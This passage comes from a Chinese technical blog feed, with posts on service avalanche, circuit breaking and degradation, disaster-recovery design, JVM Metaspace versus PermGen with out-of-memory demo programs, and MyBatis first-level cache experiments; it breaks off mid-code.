        <content type="html"><![CDATA[<h2 id="服务雪崩"><a class="markdownIt-Anchor" href="#服务雪崩"></a> 服务雪崩</h2><p>假设存在如下调用链</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/725429-20190130225819816-259073605.png" alt="" /></p><p>而此时，<code>Service A</code>的流量波动很大，流量经常会突然性增加！那么在这种情况下，就算<code>Service A</code>能扛得住请求，<code>Service B</code>和<code>Service C</code>未必能扛得住这突发的请求。</p><p>此时，如果<code>Service C</code>因为抗不住请求，变得不可用。那么<code>Service B</code>的请求也会阻塞，慢慢耗尽<code>Service B</code>的线程资源，<code>Service B</code>就会变得不可用。紧接着，<code>Service A</code>也会不可用，这一过程如下图所示</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/725429-20190130225824355-156743654.jpg" alt="" /></p><p><strong>如上图所示，一个服务失败，导致整条链路的服务都失败的情形，我们称之为服务雪崩。</strong></p><p>那么，服务熔断和服务降级就可以视为解决服务雪崩的手段之一</p><h2 id="服务熔断"><a class="markdownIt-Anchor" href="#服务熔断"></a> 服务熔断</h2><p>服务熔断：当下游的服务因为某种原因变得突然不可用或响应过慢，上游服务为了保证自己整体服务的可用性，不再继续调用目标服务，直接返回，快速释放资源。如果目标服务情况好转则恢复调用</p><p>需要说明的是熔断其实是一个框架级的处理，那么这套熔断机制的设计，基本上业内用的是<code>断路器模式</code>，如下图所示</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/725429-20190130230717121-435467568.jpg" alt="" /></p><ul><li>最开始处于<code>closed</code>状态，一旦检测到错误到达一定阈值，便转为<code>open</code>状态；</li><li>这时候会有个 reset timeout，到了这个时间了，会转移到<code>half open</code>状态；</li><li>尝试放行一部分请求到后端，一旦检测成功便回归到<code>closed</code>状态，即恢复服务；</li></ul><p>业内目前流行的熔断器很多，例如阿里出的Sentinel,以及最多人使用的Hystrix</p><p>在Hystrix中，对应配置如下</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 滑动窗口大小，默认是20</span></span><br><span class="line"><span class="attr">circuitBreaker.requestVolumeThreshold</span></span><br><span class="line"><span class="comment"># 过多长时间，熔断器再次检测是否开启，默认为5000，即5s</span></span><br><span class="line"><span class="meta">circuitBreaker.sleepWindowInMilliseconds</span> <span class="string"></span></span><br><span class="line"><span class="comment"># 错误率，默认50%</span></span><br><span class="line"><span class="attr">circuitBreaker.errorThresholdPercentage</span></span><br></pre></td></tr></table></figure><p>每当20个请求中，有50%失败后，熔断器就会打开，此时再调用服务，将会直接返回失败，不再调远程服务。直到5s后，重新检测该触发条件，判断是否把熔断器关闭，或者继续打开。</p><p>这些属于框架层级的实现，我们只要实现对应接口就好！</p><h2 id="服务降级"><a class="markdownIt-Anchor" href="#服务降级"></a> 服务降级</h2><p>下面有两种场景</p><ul><li>当下游的服务因为某种原因响应过慢，下游服务主动停掉一些不太重要的业务，释放出服务器资源，增加响应速度</li><li>当下游的服务因为某种原因不可用，上游主动调用本地的一些降级逻辑，避免卡顿，迅速返回给用户<br />其实要这么理解</li><li>服务降级有很多种降级方式！如开关降级、限流降级、熔断降级</li><li>服务熔断属于降级方式的一种</li></ul><p>从实现上来说，熔断和降级必定是一起出现。因为当发生下游服务不可用的情况，这个时候为了对最终用户负责，就需要进入上游的降级逻辑了。因此，将熔断降级视为降级方式的一种<br />服务降级大多是属于一种业务级别的处理。当然，这里要讲的是另一种降级方式，也就是开关降级，这也是我们生产中常用的另一种降级方式<br />做法很简单，做个开关，然后将开关放在配置中心，在配置中心更改开关，决定哪些服务进行降级。<br /><strong>那么，在应用程序中部下开关的这个过程，业内也有一个名词，称为埋点！</strong><br />那接下来最关键的一个问题，哪些业务需要埋点？一般有以下方法：</p><ol><li>简化执行流程<br />自己梳理出核心业务和非核心业务流程，然后在非核心业务流程加上开关，一旦发现系统扛不住，关掉开关，结束这些次要流程</li><li>关闭次要功能<br />一个微服务下肯定有很多功能，那自己区分出主要功能和次要功能。然后次要功能加上开关，需要降级的时候，把次要功能关了</li><li>降级一致性<br />假设，你在业务上发现执行流程没法简化了，愁啊！也没啥次要功能可以关了，桑心啊！那只能降低一致性了，即将核心业务流程的同步改异步，将强一致性改最终一致性！</li></ol><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><h3 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h3><p>分布式系统环境下，服务间类似依赖非常常见，一个业务调用通常依赖多个基础服务，如下图，对于同步调用，当库存服务不可用时，商品服务请求线程被阻塞，当有大批量请求调用库存服务时，最终可能导致整个商品服务资源耗尽，无法继续对外提供服务。并且这种不可用可能沿请求调用链向上传递，这种现象被称为雪崩效应。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/170502_7fqS_2663573.png" alt="" /></p><h3 id="雪崩效应常见场景"><a class="markdownIt-Anchor" href="#雪崩效应常见场景"></a> 雪崩效应常见场景</h3><ul><li>硬件故障：如服务器宕机，机房断电、光纤被挖断等</li><li>流量激增：如异常流量，重试加大流量</li><li>缓存穿透：一般发生在应用重启，所有缓存失效时，以及短时间内大量缓存失效时。大量的缓存不命中，使请求直击后端服务，造成服务提供者超负荷运行，引起服务不可用</li><li>程序BUG：如程序逻辑导致内存泄漏，JVM长时间FullGC等</li><li>同步等待：服务间采用同步调用模式，同步等待造成的资源耗尽</li></ul><h3 id="雪崩效应应对策略"><a class="markdownIt-Anchor" href="#雪崩效应应对策略"></a> 雪崩效应应对策略</h3><p>针对造成雪崩效应的不同场景，可以使用不同的应对策略，没有一种通用所有场景的策略，参考如下：</p><ul><li>硬件故障：多机房容灾、异地多活等</li><li>流量激增：服务自动扩容、流量控制（限流、关闭重试）等</li><li>缓存穿透：缓存预加载、缓存异步加载等</li><li>程序BUG：修改程序bug、及时释放资源等</li><li>同步等待：资源隔离、MQ解耦、不可用服务调用快速失败等。资源隔离通常指不同服务调用采用不同的线程池；不可用服务调用快速失败一般通过熔断器模式结合超时机制实现</li></ul><p>综上所述，如果一个应用不能对来自依赖的故障进行隔离，那该应用本身就处于被拖垮的风险中。因此，为了构建稳定、可靠的分布式系统，我们的服务应当具有自我保护意识，当依赖服务不可用时，当前服务启动自动保护功能，从而避免发生雪崩效应。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> 服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务容灾</title>
      <link href="/disaster-recovery/"/>
      <url>/disaster-recovery/</url>
      
        <content type="html"><![CDATA[<h2 id="技术指标"><a class="markdownIt-Anchor" href="#技术指标"></a> 技术指标</h2><p>RPO（Recovery Point Objective）：即数据恢复点目标，主要指的是业务系统所能容忍的数据丢失量</p><p>RTO（Recovery Time Objective）：即数据时间目标，主要指的是所能容忍的业务停止服务的最长时间，也就是从灾难发生到业务系统恢复服务功能所需要的最短时间周期</p><blockquote><p>RPO针对的是数据丢失，而RTO针对的是服务丢失，二者没有必然的联系。RTO和RPO的确定必须在进行风险分析和业务影响分析后根据不同的业务需求确定。对于不同企业的同一种业务，RTO和RPO的需求也会有所不同。</p></blockquote><h2 id="服务容灾"><a class="markdownIt-Anchor" href="#服务容灾"></a> 服务容灾</h2><h3 id="常见事故及如何容灾"><a class="markdownIt-Anchor" href="#常见事故及如何容灾"></a> 常见事故及如何容灾</h3><p>服务器故障死机——备份（硬件方案、软件方案）<br />服务雪崩——负载均衡、过载保护<br />网络环境恶劣——多运营商、异步部署就近服务</p><h3 id="设计方案"><a class="markdownIt-Anchor" href="#设计方案"></a> 设计方案</h3><h4 id="逻辑层容灾"><a class="markdownIt-Anchor" href="#逻辑层容灾"></a> 逻辑层容灾</h4><p>容灾模型：1+1容灾、1+n容灾、n+1容灾<br />切换方式主要有冷切、热切、双在线三种方式</p><p><strong>冷切</strong></p><blockquote><p>主系统跑100%业务，备系统跑0%业务；当主系统出现问题，切到备系统<br />通用性，切换到备系统有一定的时间不能提供服务，并且备系统的可信度低<br />MFS网盘文件备份数据路径<br />简单（保序），有业务无关的解决方案（HB），切换后是否正常</p></blockquote><p><strong>热切</strong></p><blockquote><p>主备系统各跑一部分业务，主系统出现问题，业务全部由备系统提供服务<br />通用性，备系统可用性较高<br />大多数系统使用：Gateway/Ad Server/Retrieval/Sku/User<br />与业务无关的解决方案（名字服务），注意切换时带宽，负载压力</p></blockquote><p><strong>双在线</strong></p><blockquote><p>主备系统提供相同的服务，各跑100%业务，请求者丢弃其中一个系统的数据<br />专用性，备系统可用性高，流量高<br />高成功率要求（RPO短），极少数核心系统用<br />复杂，通常是业务相关（有开发量），资源浪费</p></blockquote><h4 id="数据层容灾"><a class="markdownIt-Anchor" href="#数据层容灾"></a> 数据层容灾</h4><p>考虑恢复时间，采用1+n容灾<br />主要有一个主机多个备机（中心化）和不分主备（完全分布式）两种方式<br /><strong>中心化：采用快同步（增量同步）+慢同步（全量同步）的方式来保持数据一致性</strong></p><blockquote><p>快同步：当有数据写入的时候，先写到主机上，再由主机同步到备机上，主机维护同步信息队列，同步信息列表<br />慢同步：主机的同步进程定时给备机发送数据信息验证码，通过备机返回的应答，确定需要传送的缺失数据</p></blockquote><p>同时需要监控，保证不能有两个中心节点<br /><strong>去中心化（完全分布式）：数据的一致性难以保证</strong><br />简单的案例</p><blockquote><p>在t1时刻，修改D1机器上的数据，发送同步数据包给D2<br />在t2时刻，修改D2机器上的数据，发送同步包给D1<br />在t3时刻，D2收到D1的同步数据包，发现时间戳比自己的小，丢弃数据<br />在t4时刻，D1收到D2的同步数据包，校验时间通过，更新D1上的数据，如此，D1在t1时刻的修改就作废</p></blockquote><p>优化方式：给每个数据（或每组）添加一个时间戳，同步数据只校验数据本身的时间戳</p><blockquote><p>如上所述，分布式的数据存储在使用上确实不如中心化的便捷；但在某些场景下，却非常适用：数据有效性短</p><ul><li>频繁变化的最后一次操作,最后一次登录时间，IP等；在最遭的情况下，可以使用当前登录的时间，IP信息</li><li>登录的通行证：此场景下，可以在通行正中添加生成证书的服务器信息，在同步失败或其他原因引起的在提供服务器上找不到证书时，只要能解开通行证，取出生成的信息，即可到生成服务器上验证；在最糟的情况下，可重新登录，再生成新的通行证</li></ul></blockquote><p><strong>R + W &gt; N（Amazon的存储）</strong><br />大致描述为：当有5个数据节点时，设置写入成功的节点数为W时，那么在读的时候，成功的节点数达到R，满足R + W &gt; N，那么表示这个数据已经被正确读取</p><p>当系统设计只需要写3个数据节点便可以认为数据写入成功，那么当我们去读取数据时，只要能至少从3个节点中读出数据便可以认为读取数据成功<br /><em>3 + 3 &gt; 5 均衡    5 + 1 &gt; 5 重写  1 + 5 &gt; 5 重读</em></p><p><strong>对等模型的RWN方案</strong><br />Nr + Nw &gt; N（强一致性，抽屉原理）<br />Nr + Nw &lt;= N（弱一致性）<br />Quorum协议：Nw &gt; N/2（每次写入保证写入大于N/2个节点，每次读保证从大于N/2个节点读）<br />数据副本数N：N &gt;= 2，N大，安全，高qps，同步成本高</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> 服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVM中Metaspace理解</title>
      <link href="/jvm-metaspaceSize/"/>
      <url>/jvm-metaspaceSize/</url>
      
        <content type="html"><![CDATA[<h2 id="jvm参数metaspacesize的误解"><a class="markdownIt-Anchor" href="#jvm参数metaspacesize的误解"></a> JVM参数MetaspaceSize的误解</h2><p>以笔者测试环境上某个服务为例，配置了<code>-XX:MetaspaceSize=256m -XX:MaxMetaspaceSize=256m</code>，通过<code>jstat -gcutil pid</code>查看<code>M</code>的值为<code>98.32</code>，即Meta区使用率达到了<code>98.32%</code></p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-10-23%20%E4%B8%8A%E5%8D%8810.43.52.png" alt="" /></p><p>然后，再通过<code>jstat -gc 4210 2s 3</code>命名查看，结果如下图所示，计算MU/MC即Meta区的使用率确实达到了<code>98.32%</code>，但是MC，即Metaspace Capacity只有55296K，并不是参数<code>MetaspaceSize</code>指定的256M</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-10-23%20%E4%B8%8A%E5%8D%8810.44.16.png" alt="" /></p><p>那么<code>-XX:MetaspaceSize=256m</code>的含义到底是什么呢？其实，这个JVM参数是指Metaspace扩容时触发FGC的初始化阈值，也是最小的阈值。这里有几个要点需要明确：</p><ul><li>如果没有配置<code>-XX:MetaspaceSize</code>，那么触发FGC的阈值就是21807104(20.8M)，可以通过<code>jinfo -flag MetaspaceSize pid</code>得到这个值</li><li>如果配置了<code>-XX:MetaspaceSize</code>，那么触发FGC的阈值就是配置的值</li><li>Metaspace由于使用不断扩容到<code>-XX:MetaspaceSize</code>参数指定的量，就会发生FGC；且之后每次Metaspace扩容都可能会发生FGC（至于什么时候会，比较复杂，跟几个参数有关）</li><li>如果old区配置CMS垃圾回收，那么扩容引起的FGC也会使用CMS算法进行回收</li><li>如果MaxMetaspaceSize设置过小，可能会导致频繁发生FGC，甚至OOM</li></ul><blockquote><p>任何一个JVM参数的默认中可以通过java -XX:+PrintFlagsFinal -version | grep JVMParamName获取，例如<code>java -XX:+PrintFlagsFinal -version |grep MetaspaceSize</code></p></blockquote><h3 id="jdk7的permsize"><a class="markdownIt-Anchor" href="#jdk7的permsize"></a> JDK7的PermSize</h3><p>JDK8+移除了Perm，引入了Metaspace，它们两者的区别是什么呢？Metaspace上面已经总结了，无论<code>-XX:MetaspaceSize</code>和<code>-XX:MaxMetaspaceSize</code>两个参数如何设置，随着类加载越来越多不断扩容调整，直到MetaspaceSize（如果没有配置就是默认20.8m）触发FGC，上限是<code>-XX:MaxMetaspaceSize</code>，默认是无穷大。而Perm的话，我们通过配置<code>-XX:PermSize</code>以及<code>-XX:MaxPermSize</code>来控制这块内存的大小，JVM在启动的时候会根据<code>-XX:PermSize</code>初始化分配一块连续的内存块，这样的话，如果<code>-XX:PermSize</code>设置过大，就是一种赤裸裸的浪费。很明显，Metaspace比Perm好多了。</p><h2 id="permgen与metaspace"><a class="markdownIt-Anchor" href="#permgen与metaspace"></a> PermGen与Metaspace</h2><h3 id="permgen"><a class="markdownIt-Anchor" href="#permgen"></a> PermGen</h3><p>绝大部分的都见过<code>“java.lang.OutOfMemoryError:PermGen space”</code>这个异常，这里的<code>PermGen space</code>其实指的就是方法区。不过方法区和<code>PermGen space</code>又有着本质的区别。前者是JVM的规范，而后者是JVM规范的一种实现，并且只有Hotspot才有<code>PermGen space</code>，对于其他的虚拟机，并没有这个区域。由于方法区主要存储类的相关信息，所以对于动态生成类的情况比较容易出现永久代的内存溢出。最典型的应用场景就是，在JSP页面比较多的情况，容易出现永久代的内存溢出。下面我们举例说明</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.paddx.test.memory;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.paddx.test.memory;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PermGenOomMock</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        URL url = <span class="keyword">null</span>;</span><br><span class="line">        List&lt;ClassLoader&gt; classLoaderList = <span class="keyword">new</span> ArrayList&lt;ClassLoader&gt;();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            url = <span class="keyword">new</span> File(<span class="string">"/tmp"</span>).toURI().toURL();</span><br><span class="line">            URL[] urls = &#123;url&#125;;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                ClassLoader loader = <span class="keyword">new</span> URLClassLoader(urls);</span><br><span class="line">                classLoaderList.add(loader);</span><br><span class="line">                loader.loadClass(<span class="string">"com.paddx.test.memory.Test"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/820406-20160327005846979-1124627174.png" alt="" /></p><h3 id="metaspace"><a class="markdownIt-Anchor" href="#metaspace"></a> Metaspace</h3><p>JDK1.7中，存储在永久代的部分数据就已经转移到了Java Heap或者是Native Heap。但永久代仍存在于JDK1.7中，并没完全移除，譬如符号引用（Symbols）转移到了native heap；字面量（interned strings）转移到了java heap；类的静态变量（class statics）转移到了java heap。我们可以通过一段程序来比较 JDK 1.6 与 JDK 1.7及 JDK 1.8 的区别，以字符串常量为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.paddx.test.memory;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StringOomMock</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> String  base = <span class="string">"string"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Integer.MAX_VALUE; i++)&#123;</span><br><span class="line">            String str = base + base;</span><br><span class="line">            base = str;</span><br><span class="line">            list.add(str.intern());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段程序以2的指数级不断的生成新的字符串，这样可以比较快速的消耗内存。我们通过 JDK 1.6、JDK 1.7 和 JDK 1.8 分别运行：</p><p>JDK 1.6 的运行结果</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/820406-20160327005929386-409283462.png" alt="" /></p><p>JDK 1.7的运行结果</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/820406-20160327010033823-1341228280.png" alt="" /></p><p>JDK 1.8的运行结果</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/820406-20160327010143776-1612977566.png" alt="" /></p><p>从上述结果可以看出，JDK1.6下，会出现<code>PermGen Space</code>的内存溢出，而在JDK1.7和JDK1.8中，会出现堆内存溢出，并且JDK1.8中<code>PermSize</code>和<code>MaxPermGen</code>已经无效。因此，可以大致验证JDK1.7和1.8将字符串常量由永久代转移到堆中，并且JDK1.8中已经不存在永久代。</p><blockquote><p>元空间的本质和永久代相似，都是JVM规范中对方法区的实现。**不过元空间和永久代之间最大的区别在于：元空间并不在虚拟机中，而是使用本地内存。**因此，默认情况下，元空间的大小仅受本地内存的限制，但可以通过以下参数来指定元空间的大小</p></blockquote><ul><li><code>XX:MetaspaceSize</code>：初始空间大小，达到该值就会触发垃圾收集进行类型卸载，同时GC会对该值进行调整：如果释放了大量的空间，就适当降低该值；如果释放了很少的空间，那么在不超过MaxMetaspaceSize时，适当提高该值</li><li><code>XX:MaxMetaspaceSize</code>：最大空间，默认是没有限制的</li></ul><p>除了指定上面两个参数，还有两个与GC相关的属性</p><ul><li><code>XX:MinMetaspaceFreeRatio</code>：在GC之后，最小的Metaspace剩余空间容量的百分比，减少为分配空间所导致的垃圾收集</li><li><code>XX:MaxMetaspaceFreeRatio</code>：在GC之后，最大的Metaspace剩余空间容量的百分比，减少为释放空间所导致的垃圾收集</li></ul><h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h3><p>通过上面分析，大家应该大致了解了 JVM 的内存划分，也清楚了 JDK 8 中永久代向元空间的转换。不过大家应该都有一个疑问，就是为什么要做这个转换？所以，最后给大家总结以下几点原因：</p><ul><li>字符串存在永久代中，容易出现性能问题和内存溢出</li><li>类及方法的信息等比较难确定其大小，因此对于永久代的大小指定比较困难，太小容易出现永久代溢出，太大则容易导致老年代溢出</li><li>永久代会为 GC 带来不必要的复杂度，并且回收效率偏</li><li>Oracle 可能会将HotSpot 与 JRockit 合二为一</li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> JVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis缓存机制</title>
      <link href="/mybatis-cache/"/>
      <url>/mybatis-cache/</url>
      
        <content type="html"><![CDATA[<h2 id="一级缓存"><a class="markdownIt-Anchor" href="#一级缓存"></a> 一级缓存</h2><h3 id="一级缓存介绍"><a class="markdownIt-Anchor" href="#一级缓存介绍"></a> 一级缓存介绍</h3><p>在应用运行过程中，我们有可能在一次数据库会话中，执行多次查询条件完全相同的SQL，Mybatis提供了一级缓存的方案优化这部分场景，如果是相同的SQL语句，会优先命中一级缓存，避免直接对数据库进行查询，提高性能，具体执行过程如下图所示</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/6e38df6a.jpg" alt="" /></p><p>每个SqlSession中持有了Executor，每个Executor中有一个LocalCache。当用户发起查询时，Mybatis根据当前执行的语句生成MappedStatement，在LocalCache进行查询，如果命中缓存的话，直接返回结果给用户，如果缓存没有命中的话，查询数据库，结果写入LocalCache，最后返回结果给用户。具体实现类的类关系图如下图所示。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/d76ec5fe.jpg" alt="" /></p><h3 id="一级缓存配置"><a class="markdownIt-Anchor" href="#一级缓存配置"></a> 一级缓存配置</h3><p>我们来看看如何使用Mybatis一级缓存。开发者只需在Mybatis的配置文件中，添加如下语句，就可以使用一级缓存。共有两个选项，<code>session</code>和<code>statement</code>，默认是<code>session</code>级别，即在一个Mybatis会话中执行的所有语句，都会共享这一个缓存，一种是<code>statement</code>级别，可以理解为缓存只对当前执行的这一个statement有效。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">"localCacheScope"</span> <span class="attr">value</span>=<span class="string">"SESSION"</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="一级缓存实验"><a class="markdownIt-Anchor" href="#一级缓存实验"></a> 一级缓存实验</h3><p>首先创建实例表，创建对应的POJO类和增改的方法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`student`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">200</span>) <span class="keyword">COLLATE</span> utf8_bin <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`age`</span> <span class="built_in">tinyint</span>(<span class="number">3</span>) <span class="keyword">unsigned</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> AUTO_INCREMENT=<span class="number">4</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 <span class="keyword">COLLATE</span>=utf8_bin;</span><br></pre></td></tr></table></figure><p>在以下实验中，id为1的学生名称是凯伦</p><h4 id="实验1"><a class="markdownIt-Anchor" href="#实验1"></a> 实验1</h4><p>开启一级缓存，范围为会话级别，调用三次<code>getStudentById</code>，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getStudentById</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  SqlSession sqlSession = factory.openSession(<span class="keyword">true</span>); <span class="comment">// 自动提交事务</span></span><br><span class="line">  StudentMapper studentMapper = sqlSession.getMapper(StudentMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">  System.out.println(studentMapper.getStudentById(<span class="number">1</span>));</span><br><span class="line">  System.out.println(studentMapper.getStudentById(<span class="number">1</span>));</span><br><span class="line">  System.out.println(studentMapper.getStudentById(<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/9e996384.jpg" alt="" /></p><p>我们能够看到，只要第一次真正查询了数据库，后续地查询使用了一级缓存</p><h4 id="实验2"><a class="markdownIt-Anchor" href="#实验2"></a> 实验2</h4><p>增加了对数据库的修改操作，验证在一次数据库会话中，如果对数据库发生了修改操作，一级缓存是否会失效</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addStudent</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  SqlSession sqlSession = factory.openSession(<span class="keyword">true</span>);</span><br><span class="line">  StudentMapper studentMapper = sqlSession.getMapper(StudentMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">  System.out.println(studentMapper.getStudentById(<span class="number">1</span>));</span><br><span class="line">  System.out.println(<span class="string">"增加了"</span> + studentMapper.addStudent(buildStudent()) + <span class="string">"个学生"</span>);</span><br><span class="line">  System.out.println(studentMapper.getStudentById(<span class="number">1</span>));</span><br><span class="line">  sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/fb6a78e0.jpg" alt="" /></p><p>我们能够看到，在修改操作后执行的相同查询，查询了数据库，一级缓存失效</p><h4 id="实验3"><a class="markdownIt-Anchor" href="#实验3"></a> 实验3</h4><p>开启了两个SqlSession，在sqlSession中查询数据，使一级缓存生效，在sqlSession2中更新数据库，验证一级缓存只在数据库会话内部共享</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testLocalCacheScope</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        SqlSession sqlSession1 = factory.openSession(<span class="keyword">true</span>); 